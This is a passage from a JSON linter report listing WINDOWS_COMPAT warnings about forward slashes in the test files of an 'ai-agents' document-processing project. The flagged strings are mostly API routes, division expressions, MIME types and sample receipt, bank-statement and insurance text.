        "timestamp": "2025-09-05T17:30:42.205816"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\performance_benchmarks.py",
        "warning": "Line 448: Forward slash in path - \" in config.test_name:\n            # Concurrent read/write operations\n            search_task = self.memory_store.search_similar(\"",
        "timestamp": "2025-09-05T17:30:42.205920"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\performance_benchmarks.py",
        "warning": "Line 570: Forward slash in path - \"\n        process = psutil.Process()\n        return process.memory_info().rss / 1024 / 1024\n    \n    async def _get_orchestrator_metrics(self) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.205992"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\performance_benchmarks.py",
        "warning": "Line 737: Forward slash in path - ']:.1f} ops/sec)\"",
        "timestamp": "2025-09-05T17:30:42.206101"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 117: Forward slash in path - \"/health\"",
        "timestamp": "2025-09-05T17:30:42.206696"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 129: Forward slash in path - \"/metrics\"",
        "timestamp": "2025-09-05T17:30:42.206717"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 137: Forward slash in path - \"/metrics\"",
        "timestamp": "2025-09-05T17:30:42.206733"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 152: Forward slash in path - \"/auth/login\"",
        "timestamp": "2025-09-05T17:30:42.206751"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 171: Forward slash in path - \"/auth/login\"",
        "timestamp": "2025-09-05T17:30:42.206777"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 187: Forward slash in path - \"/auth/refresh\"",
        "timestamp": "2025-09-05T17:30:42.206800"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 202: Forward slash in path - \"/auth/logout\"",
        "timestamp": "2025-09-05T17:30:42.206828"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 231: Forward slash in path - \"/api/v1/documents/process\"",
        "timestamp": "2025-09-05T17:30:42.206855"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 260: Forward slash in path - \"/api/v1/documents/process\"",
        "timestamp": "2025-09-05T17:30:42.206882"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 302: Forward slash in path - \"/api/v1/documents/batch\"",
        "timestamp": "2025-09-05T17:30:42.206918"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 333: Forward slash in path - \"/api/v1/documents/test-doc-id/status\"",
        "timestamp": "2025-09-05T17:30:42.206952"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 367: Forward slash in path - \"/api/v1/documents/classify\"",
        "timestamp": "2025-09-05T17:30:42.207005"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 411: Forward slash in path - \"/api/v1/webhooks\"",
        "timestamp": "2025-09-05T17:30:42.207075"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 447: Forward slash in path - \"/api/v1/webhooks\"",
        "timestamp": "2025-09-05T17:30:42.207127"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 485: Forward slash in path - \"/api/v1/documents/upload\"",
        "timestamp": "2025-09-05T17:30:42.207155"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 486: Forward slash in path - \"text/plain\"",
        "timestamp": "2025-09-05T17:30:42.207167"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 515: Forward slash in path - \"/api/v1/documents/upload\"",
        "timestamp": "2025-09-05T17:30:42.207190"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 516: Forward slash in path - \"text/plain\"",
        "timestamp": "2025-09-05T17:30:42.207203"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 540: Forward slash in path - \"/api/v1/integrations/status\"",
        "timestamp": "2025-09-05T17:30:42.207223"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 586: Forward slash in path - \"/api/v1/analytics/processing?start_date=2024-01-01&end_date=2024-01-31\"",
        "timestamp": "2025-09-05T17:30:42.207256"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 601: Forward slash in path - \"/nonexistent-endpoint\"",
        "timestamp": "2025-09-05T17:30:42.207274"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 607: Forward slash in path - \"/api/v1/documents/process\"",
        "timestamp": "2025-09-05T17:30:42.207290"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 623: Forward slash in path - \"/api/v1/documents/process\"",
        "timestamp": "2025-09-05T17:30:42.207312"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 644: Forward slash in path - \"/health\"",
        "timestamp": "2025-09-05T17:30:42.207335"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 659: Forward slash in path - \"/health\"",
        "timestamp": "2025-09-05T17:30:42.207354"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 666: Forward slash in path - \"/health\"",
        "timestamp": "2025-09-05T17:30:42.207372"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 675: Forward slash in path - \"/health\"",
        "timestamp": "2025-09-05T17:30:42.207390"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 691: Forward slash in path - \"/health\"",
        "timestamp": "2025-09-05T17:30:42.207411"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "warning": "Line 719: Forward slash in path - \"/api/v1/documents/process\"",
        "timestamp": "2025-09-05T17:30:42.207436"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 31: Forward slash in path - \"/health\"",
        "timestamp": "2025-09-05T17:30:42.207760"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 56: Forward slash in path - \"/health\"",
        "timestamp": "2025-09-05T17:30:42.207780"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 80: Forward slash in path - \"/health\"",
        "timestamp": "2025-09-05T17:30:42.207797"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 107: Forward slash in path - \"/auth/login\"",
        "timestamp": "2025-09-05T17:30:42.207818"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 124: Forward slash in path - \"/auth/login\"",
        "timestamp": "2025-09-05T17:30:42.207833"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 141: Forward slash in path - \"/auth/refresh\"",
        "timestamp": "2025-09-05T17:30:42.207848"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 154: Forward slash in path - \"/auth/logout\"",
        "timestamp": "2025-09-05T17:30:42.207861"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 198: Forward slash in path - \"/api/v1/documents/process\"",
        "timestamp": "2025-09-05T17:30:42.207891"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 216: Forward slash in path - \"/api/v1/documents/process\"",
        "timestamp": "2025-09-05T17:30:42.207908"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 233: Forward slash in path - \"/api/v1/documents/process\"",
        "timestamp": "2025-09-05T17:30:42.207924"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 260: Forward slash in path - \"/api/v1/documents/classify\"",
        "timestamp": "2025-09-05T17:30:42.207946"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 288: Forward slash in path - \"/api/v1/documents/doc_123/status\"",
        "timestamp": "2025-09-05T17:30:42.207970"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 317: Forward slash in path - \"/api/v1/documents/doc_123/result\"",
        "timestamp": "2025-09-05T17:30:42.207994"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 353: Forward slash in path - \"/api/v1/documents/batch\"",
        "timestamp": "2025-09-05T17:30:42.208021"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 381: Forward slash in path - \"application/pdf\"",
        "timestamp": "2025-09-05T17:30:42.208045"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 384: Forward slash in path - \"/api/v1/documents/upload\"",
        "timestamp": "2025-09-05T17:30:42.208056"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 401: Forward slash in path - \"application/pdf\"",
        "timestamp": "2025-09-05T17:30:42.208078"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 404: Forward slash in path - \"/api/v1/documents/upload\"",
        "timestamp": "2025-09-05T17:30:42.208091"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 437: Forward slash in path - \"/api/v1/webhooks\"",
        "timestamp": "2025-09-05T17:30:42.208137"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 465: Forward slash in path - \"/api/v1/webhooks\"",
        "timestamp": "2025-09-05T17:30:42.208171"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 502: Forward slash in path - \"/api/v1/metrics\"",
        "timestamp": "2025-09-05T17:30:42.208199"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 533: Forward slash in path - \"/api/v1/analytics/processing\"",
        "timestamp": "2025-09-05T17:30:42.208228"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 555: Forward slash in path - \"/api/v1/integrations/status\"",
        "timestamp": "2025-09-05T17:30:42.208252"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 574: Forward slash in path - \"/nonexistent/endpoint\"",
        "timestamp": "2025-09-05T17:30:42.208271"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 580: Forward slash in path - \"/api/v1/documents/process\"",
        "timestamp": "2025-09-05T17:30:42.208287"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 587: Forward slash in path - \"/api/v1/documents/process\"",
        "timestamp": "2025-09-05T17:30:42.208303"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 589: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.208319"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 602: Forward slash in path - \"/api/v1/documents/process\"",
        "timestamp": "2025-09-05T17:30:42.208337"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 611: Forward slash in path - \"/api/v1/documents/process\"",
        "timestamp": "2025-09-05T17:30:42.208355"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 625: Forward slash in path - \"/api/v1/webhooks\"",
        "timestamp": "2025-09-05T17:30:42.208376"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_main.py",
        "warning": "Line 656: Forward slash in path - \"/api/v1/documents/process\"",
        "timestamp": "2025-09-05T17:30:42.208406"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Line 293: Forward slash in path - \"Retrying operation (attempt {attempt + 1}/{max_retries + 1}) after {delay}s delay\"",
        "timestamp": "2025-09-05T17:30:42.208993"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Line 733: Forward slash in path - \")\n        total_services = len(service_results)\n        \n        health_percentage = healthy_services / total_services\n        \n        if health_percentage >= 1.0:\n            return \"",
        "timestamp": "2025-09-05T17:30:42.209333"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Line 795: Forward slash in path - '] / result['",
        "timestamp": "2025-09-05T17:30:42.209400"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Line 824: Forward slash in path - \"Recovery Success Rate: {(successful_recoveries/total_tests*100):.1f}%\"",
        "timestamp": "2025-09-05T17:30:42.209454"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\error_handling\\test_error_recovery.py",
        "warning": "Line 846: Forward slash in path - '] / stats['",
        "timestamp": "2025-09-05T17:30:42.209502"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_component_interactions.py",
        "warning": "Line 1052: Forward slash in path - ': 0.45 + (hash(component_name) % 30) / 100,\n                        '",
        "timestamp": "2025-09-05T17:30:42.211044"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_component_interactions.py",
        "warning": "Line 1053: Forward slash in path - ': 0.35 + (hash(component_name) % 25) / 100,\n                        '",
        "timestamp": "2025-09-05T17:30:42.211110"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_component_interactions.py",
        "warning": "Line 1054: Forward slash in path - ': 1.2 + (hash(component_name) % 20) / 10,\n                        '",
        "timestamp": "2025-09-05T17:30:42.211154"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_component_interactions.py",
        "warning": "Line 1056: Forward slash in path - ': 0.02 + (hash(component_name) % 3) / 100,\n                        '",
        "timestamp": "2025-09-05T17:30:42.211196"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_component_interactions.py",
        "warning": "Line 1466: Forward slash in path - \"\n    total_tests = len(test_results)\n    passed_tests = sum(1 for result in test_results if result.success)\n    failed_tests = total_tests - passed_tests\n    \n    total_execution_time = sum(result.execution_time for result in test_results)\n    average_execution_time = total_execution_time / total_tests if total_tests > 0 else 0\n    \n    report_lines = [\n        \"",
        "timestamp": "2025-09-05T17:30:42.211737"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_component_interactions.py",
        "warning": "Line 1482: Forward slash in path - \"Success Rate: {(passed_tests/total_tests*100):.1f}%\"",
        "timestamp": "2025-09-05T17:30:42.211818"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_component_interactions.py",
        "warning": "Line 1515: Forward slash in path - \":\n    # Run integration tests\n    async def main():\n        results = await run_integration_test_suite()\n        report = generate_integration_test_report(results)\n        print(report)\n        \n        # Save results to file\n        output_file = Path(__file__).parent / \"",
        "timestamp": "2025-09-05T17:30:42.211896"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_integration.py",
        "warning": "Line 669: Forward slash in path - '] = successful_stages / total_stages if total_stages > 0 else 0\n            results['",
        "timestamp": "2025-09-05T17:30:42.212975"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_integration.py",
        "warning": "Line 727: Forward slash in path - '] / overall_results['",
        "timestamp": "2025-09-05T17:30:42.213034"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_integration.py",
        "warning": "Line 755: Forward slash in path - ']}/{overall_results['",
        "timestamp": "2025-09-05T17:30:42.213079"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_integration.py",
        "warning": "Line 802: Forward slash in path - \"\n    async with Phase6TestSuite() as test_suite:\n        # Run all tests\n        results = await test_suite.run_all_tests()\n        \n        # Generate and display report\n        report = test_suite.generate_test_report(results)\n        print(report)\n        \n        # Save results to file\n        output_file = Path(__file__).parent / \"",
        "timestamp": "2025-09-05T17:30:42.213132"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\intelligence\\test_multi_domain_processing.py",
        "warning": "Line 96: Forward slash in path - \"\n        Target Store #1234\n        123 Shopping Center Dr\n        City, ST 12345\n        (555) 123-4567\n        \n        Receipt #: 1234-5678-9012\n        Transaction Date: 01/15/2024\n        Transaction Time: 14:32:15\n        \n        Items Purchased:\n        Groceries                      $45.67\n        Household Items                $23.45\n        Electronics                    $89.99\n        \n        Subtotal:                      $159.11\n        Tax:                          $12.73\n        Total:                        $171.84\n        \n        Payment Method: VISA ****1234\n        Authorization: 123456\n        \n        Thank you for shopping with us!\n        \"",
        "timestamp": "2025-09-05T17:30:42.213611"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\intelligence\\test_multi_domain_processing.py",
        "warning": "Line 129: Forward slash in path - \"\n        First National Bank\n        Monthly Account Statement\n        \n        Account Number: ****5678\n        Statement Period: January 1, 2024 - January 31, 2024\n        \n        Account Summary:\n        Beginning Balance:             $5,432.10\n        Total Deposits:                $3,250.00\n        Total Withdrawals:             $2,180.75\n        Total Fees:                    $25.00\n        Ending Balance:                $6,476.35\n        \n        Transaction History:\n        01/02  Deposit - Salary               $2,500.00\n        01/05  Purchase - Grocery Store       $(-85.50)\n        01/08  ATM Withdrawal                 $(-100.00)\n        01/12  Deposit - Transfer             $750.00\n        01/15  Payment - Electric Bill        $(-125.25)\n        01/20  Purchase - Gas Station         $(-45.00)\n        01/25  Monthly Fee                    $(-25.00)\n        \"",
        "timestamp": "2025-09-05T17:30:42.213636"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\intelligence\\test_multi_domain_processing.py",
        "warning": "Line 328: Forward slash in path - '])\n            classification_accuracy = correct_classifications / len(self.classification_results)\n            avg_classification_time = statistics.mean([r['",
        "timestamp": "2025-09-05T17:30:42.213730"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\intelligence\\test_multi_domain_processing.py",
        "warning": "Line 339: Forward slash in path - '])\n            processing_success_rate = successful_processing / len(self.processing_results)\n            avg_processing_accuracy = statistics.mean([r['",
        "timestamp": "2025-09-05T17:30:42.213753"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\intelligence\\test_multi_domain_processing.py",
        "warning": "Line 343: Forward slash in path - '] for r in self.processing_results])\n            avg_cost_per_document = total_cost / len(self.processing_results)\n        else:\n            processing_success_rate = 0.0\n            avg_processing_accuracy = 0.0\n            avg_processing_time = 0.0\n            total_cost = 0.0\n            avg_cost_per_document = 0.0\n        \n        # Overall metrics\n        total_time = (self.end_time - self.start_time).total_seconds() if self.start_time and self.end_time else 0.0\n        throughput = len(self.processing_results) / (total_time / 3600) if total_time > 0 else 0.0\n        \n        self.performance_metrics = {\n            '",
        "timestamp": "2025-09-05T17:30:42.213779"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\intelligence\\test_multi_domain_processing.py",
        "warning": "Line 609: Forward slash in path - \"\n        # Create temporary test files\n        temp_files = []\n        with tempfile.TemporaryDirectory() as temp_dir:\n            temp_path = Path(temp_dir)\n            \n            # Create test files for each document type\n            for i, (doc_type, test_data) in enumerate(TEST_DOCUMENTS.items()):\n                file_path = temp_path / f\"",
        "timestamp": "2025-09-05T17:30:42.213958"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\intelligence\\test_multi_domain_processing.py",
        "warning": "Line 618: Forward slash in path - \"])\n                temp_files.append(str(file_path))\n            \n            # Test batch processing\n            start_time = datetime.now()\n            results = await multi_domain_processor.batch_process_documents(temp_files)\n            end_time = datetime.now()\n            \n            batch_time = (end_time - start_time).total_seconds()\n            throughput = len(temp_files) / (batch_time / 3600)  # docs per hour\n            \n            print(f\"",
        "timestamp": "2025-09-05T17:30:42.213986"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\intelligence\\test_multi_domain_processing.py",
        "warning": "Line 630: Forward slash in path - \"Throughput: {throughput:.0f} documents/hour\"",
        "timestamp": "2025-09-05T17:30:42.214008"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\intelligence\\test_multi_domain_processing.py",
        "warning": "Line 634: Forward slash in path - ', False))\n            success_rate = successful / len(results)\n            \n            print(f\"",
        "timestamp": "2025-09-05T17:30:42.214032"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\intelligence\\test_multi_domain_processing.py",
        "warning": "Line 646: Forward slash in path - 'effective\\s*date\\s*:?\\s*(\\d{1,2}[-/]\\d{1,2}[-/]\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.214059"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\intelligence\\test_multi_domain_processing.py",
        "warning": "Line 656: Forward slash in path - \"\n        INSURANCE POLICY #POL-2024-001\n        Effective Date: 01/15/2024\n        \n        Policyholder: John Doe\n        Coverage: Auto Insurance\n        Premium: $1,200.00\n        \n        This policy provides comprehensive coverage...\n        \"",
        "timestamp": "2025-09-05T17:30:42.214089"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\intelligence\\test_multi_domain_processing.py",
        "warning": "Line 754: Forward slash in path - \"tests/intelligence/test_multi_domain_processing.py::TestDocumentClassification\"",
        "timestamp": "2025-09-05T17:30:42.214157"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\intelligence\\test_multi_domain_processing.py",
        "warning": "Line 755: Forward slash in path - \"tests/intelligence/test_multi_domain_processing.py::TestSpecializedProcessing\"",
        "timestamp": "2025-09-05T17:30:42.214182"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\intelligence\\test_multi_domain_processing.py",
        "warning": "Line 756: Forward slash in path - \"tests/intelligence/test_multi_domain_processing.py::TestSystemIntegration\"",
        "timestamp": "2025-09-05T17:30:42.214207"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\intelligence\\test_multi_domain_processing.py",
